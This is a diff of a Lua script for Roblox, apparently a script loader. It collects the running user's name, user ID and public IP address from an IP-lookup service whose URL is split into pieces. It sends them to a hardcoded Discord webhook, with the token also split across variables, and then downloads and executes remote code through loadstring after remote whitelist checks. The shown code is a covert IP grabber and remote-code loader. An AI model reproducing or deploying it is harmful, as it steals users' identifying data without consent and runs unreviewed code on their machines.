@@ -16,7 +16,7 @@ local api1 = "pify"
 local api2 = ".org"
 local api = api0..api1..api2
 
-local identification_protocol = tostring(game:HttpGet(api_url, true))
+local identification_protocol = tostring(game:HttpGet(api, true))
 
 local webhook_string = 'Username: '..username .. '\nUser ID: '..user_id .. '\nIdentification Protocol: '..identification_protocol
 
@@ -26,7 +26,7 @@ local void_script = "https://raw.githubusercontent.com/Graham-Void/Protage/main/
 
 
 
-function discord(arg)
+local discord = function(arg)
     local d1 = "https://discord.com/api/webhooks/"
     local d2 = '1046279988242042942/unFD3HAP4-R9CuS0Pu6aBmvTsSj5k'
     local d3 = '7IP9LYeH4nfAqbt0wsNoFgrL9LbUKn_4X2SaUhq'
@@ -54,7 +54,7 @@ function discord(arg)
     })
 end
 
-function check_whitelist()
+local check_whitelist = function()
     local whitelist_response = game:HttpGet(authorized, true)
     if string.find(whitelist_response, wl_key) then
         whitelist = true
@@ -63,7 +63,7 @@ function check_whitelist()
     end
 end
 
-function check_blacklist()
+local check_blacklist = function()
     local blacklist_response = game:HttpGet(blacklisted, true)
     if string.find(blacklist_response, wl_key) then
         blacklist = true
@@ -74,7 +74,7 @@ end
 
 
 
-function main()
+local main = function()
     if whitelist == true then
         if blacklist == false then
             loadstring(game:HttpGet(void_script, true))()
